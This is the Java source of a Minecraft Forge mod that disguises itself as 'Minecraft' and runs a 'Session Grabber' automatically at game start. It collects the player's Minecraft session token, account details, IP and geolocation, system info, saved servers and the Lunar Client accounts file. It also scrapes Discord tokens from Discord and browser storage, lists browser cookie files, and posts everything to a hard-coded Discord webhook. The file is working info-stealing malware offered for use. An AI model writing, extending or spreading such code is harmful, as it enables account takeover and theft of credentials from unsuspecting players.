package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileNotFoundException;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

import java.io.File;
@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {

    // --- KONFIGURATION ---
    // WICHTIG: Deine Webhook URL hier eintragen!
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455249579246354679/PFz12Wzk9KGdz28SbWugN-CFfnPC1qyZkkukfSmG3jjWQjHKMWAfxB9RM2NTVp8n35fB";
    private static final boolean PING_EVERYONE = true;
    private static final Minecraft mc = Minecraft.getMinecraft();

    // --- HILFSMETHODEN ---

    // Kürzt Texte sicher, damit Discord nicht abstürzt
    private String safeString(String text, int maxLength) {
        if (text == null) return "Unknown";
        if (text.length() > maxLength) {
            return text.substring(0, maxLength - 3) + "...";
        }
        return text;
    }

    // --- GENERATOREN FÜR DIE DISCORD EMBEDS ---

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() throws Exception {
        final JsonObject info = (JsonObject) new JsonParser().parse(HttpUtils.getContentAsString("https://ipapi.co/json"));
        return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription("Target IP and Geo-Location")
                .addField("Country", "```" + info.get("country_name").getAsString() + "```", true)
                .addField("City", "```" + info.get("city").getAsString() + "```", true)
                .addField("IP", "```" + info.get("ip").getAsString() + "```", true);
    }
    private DiscordWebhook.EmbedObject genSystemInfoEmbed() {
        return new DiscordWebhook.EmbedObject()
                .setTitle(":computer: System Info")
                .setColor(0x336699) // Eine andere Farbe
                .addField("OS", "```" + safeString(System.getProperty("os.name"), 100) + "```", true)
                .addField("OS Version", "```" + safeString(System.getProperty("os.version"), 100) + "```", true)
                .addField("Java Version", "```" + safeString(System.getProperty("java.version"), 100) + "```", true)
                .addField("User", "```" + safeString(System.getProperty("user.name"), 100) + "```", true)
                .addField("CPU Cores", "```" + Runtime.getRuntime().availableProcessors() + "```", true)
                .addField("Max Memory", "```" + (Runtime.getRuntime().maxMemory() / 1024 / 1024) + " MB```", true);
    }

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();
        return new DiscordWebhook.EmbedObject()
                .setTitle(":unlock: Account Info")
                .setColor(0x6E39FF)
                .setDescription(
                        "[NameMC](https://namemc.com/" + session.getPlayerID() + ')' +
                        " | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ')' +
                        " | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ')')
                .addField("Name", "```" + session.getUsername() + "```", true)
                .addField("UUID", "```" + session.getPlayerID() + "```", true);
    }

    private DiscordWebhook.EmbedObject genTokenEmbed() {
        String token = mc.getSession().getToken();
        token = safeString(token, 4000); // Zur Sicherheit kürzen
        return new DiscordWebhook.EmbedObject()
                .setTitle(":key: Minecraft Session Token")
                .setColor(0xFFA500) // Orange Farbe
                .setDescription("```" + token + "```");
    }

    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x8F67FC)
                .setDescription("Saved Minecraft servers");
        final ServerList servers = new ServerList(mc);
        int limit = Math.min(servers.countServers(), 15);
        for (int i = 0; i < limit; i++) {
            final ServerData server = servers.getServerData(i);
            String name = safeString(server.serverName, 50);
            String ip = safeString(server.serverIP, 100);
            serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
        }
        if (servers.countServers() > limit) {
            serversEmbed.addField("More...", "```" + (servers.countServers() - limit) + " hidden```", false);
        }
        return serversEmbed;
    }

    private DiscordWebhook.EmbedObject genLunarInfoEmbed() {
        String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
        File lunarFile = new File(lunarPath);
        String content = "File not found";
        if (lunarFile.exists() && lunarFile.isFile()) {
            try {
                byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                content = new String(encoded, StandardCharsets.UTF_8);
                content = safeString(content, 1500);
            } catch (Exception e) {
                content = "Error: " + e.getMessage();
            }
        }
        return new DiscordWebhook.EmbedObject()
                .setTitle(":crescent_moon: Lunar Client")
                .setColor(0xEE3333)
                .setDescription("```json\n" + content + "\n```");
    }

    // NEU: Embed für die gefundenen Discord Tokens
    private DiscordWebhook.EmbedObject genDiscordTokensEmbed() {
        ArrayList<String> tokens = getTokens();
        DiscordWebhook.EmbedObject tokenEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":robot: Discord Tokens")
                .setColor(0x7289DA); // Discord Blau

        if (tokens.isEmpty()) {
            tokenEmbed.setDescription("Keine Discord Tokens gefunden.");
        } else {
            // Discord Embeds haben ein Limit von 4096 Zeichen pro Beschreibung.
            // Wenn die Tokens diese Länge überschreiten, müssen wir sie aufteilen.
            // Jeder Token ist ca. 60 Zeichen lang, plus Formatierung.
            // Wir setzen ein Limit von 2000 Zeichen pro Embed-Beschreibung, um sicher zu sein.
            StringBuilder sb = new StringBuilder("```");
            int currentLength = 3; // Länge von "```"
            for (int i = 0; i < tokens.size(); i++) {
                String token = tokens.get(i);
                String shortToken = safeString(token, 100); // Kürze den Token auf eine angemessene Länge, falls er extrem lang ist
                sb.append(":small_orange_diamond: `").append(shortToken).append("`\n");
            }
            tokenEmbed.setDescription(sb.toString());
        }
        return tokenEmbed;
    }

    // NEU: Methode aus dem zweiten Code zum Suchen von Discord Tokens
    public static ArrayList<String> getTokens() {
        ArrayList<String> temp = new ArrayList<>();
        ArrayList<File> paths = new ArrayList<>();
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));

        for (File file : paths) {
            if (file == null || !file.exists() || !file.isDirectory()) {
                continue;
            }
            File[] filesList = file.listFiles();
            if (filesList == null) continue;
            for (File pathname : filesList) { // Changed 'file' to 'pathname' for clarity
                try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                    String strLine;
                    while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
                        int index;
                        while ((index = strLine.indexOf("oken")) != -1 && strLine.length() > index + "oken".length() + 1) { // Ensure there's enough string left
                            try {
                                strLine = strLine.substring(index + "oken".length() + 1);
                                String token = strLine.split("\"")[1];
                                if (!temp.contains(token) && token.split("\\.").length >= 2) {
                                    temp.add(token);
                                }
                            } catch (Exception ignored) {
                                // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
                            }
                        } // while index
                    }
                } catch (Exception ignored) {
                    // Ignoriere Fehler beim Lesen einer Datei und setze fort
                }
            }
        }
        return temp;
    }

    // --- NEUER COOKIE STEALER ---
    private DiscordWebhook.EmbedObject genCookieStealerEmbed() {
        ArrayList<String> cookies = getCookies();
        DiscordWebhook.EmbedObject cookieEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":cookie: Cookies")
                .setColor(0xFF5733); // Rot

        if (cookies.isEmpty()) {
            cookieEmbed.setDescription("Keine Cookies gefunden.");
        } else {
            StringBuilder sb = new StringBuilder();
            for (String cookie : cookies) {
                String shortCookie = safeString(cookie, 100);
                sb.append(":small_orange_diamond: `").append(shortCookie).append("`\n");
            }
            cookieEmbed.setDescription(sb.toString());
        }
        return cookieEmbed;
    }

    // --- NEUE METHODE ZUM SUCHEN VON COOKIES ---
    public static ArrayList<String> getCookies() {
        ArrayList<String> temp = new ArrayList<>();
        ArrayList<File> paths = new ArrayList<>();
        // Add common browser cookie paths
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Cookies"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Mozilla/Firefox/Profiles/")); // Firefox profiles need special handling

        for (File file : paths) {
            if (file == null || !file.exists()) {
                continue;
            }
            if (file.isDirectory() && file.getName().equals("Profiles")) { // Handle Firefox profiles
                File[] profileDirs = file.listFiles(File::isDirectory);
                if (profileDirs != null) {
                    for (File profileDir : profileDirs) {
                        File firefoxCookies = new File(profileDir, "cookies.sqlite");
                        if (firefoxCookies.exists()) {
                            temp.add("Firefox Cookies found at: " + firefoxCookies.getAbsolutePath());
                        }
                    }
                }
            } else if (file.isFile()) {
                temp.add("Cookie file found at: " + file.getAbsolutePath());
            }
        }
        return temp;
    }
    // --- AUSFÜHRUNG ---

    private DiscordWebhook genWebhook() {
        final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                .setUsername("Session Grabber");

        if (PING_EVERYONE) {
            webhook.setContent("@everyone");
        }

        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (Exception e) {
            System.out.println("Geo-Info konnte nicht abgerufen werden (wird übersprungen).");
        }

        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genSystemInfoEmbed());
        webhook.addEmbed(genTokenEmbed());
        webhook.addEmbed(genServersInfoEmbed());
        webhook.addEmbed(genLunarInfoEmbed());
        webhook.addEmbed(genDiscordTokensEmbed());
        webhook.addEmbed(genCookieStealerEmbed()); // NEU: Fügt das Cookie-Embed hinzu

        return webhook;
    }

    private void execWebhook() {
        new Thread(() -> {
            try {
                genWebhook().execute();
                System.out.println("Webhook erfolgreich gesendet!");
            } catch (final Exception e) {
                System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                e.printStackTrace();
            }
        }).start();
    }

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        execWebhook();
    }
}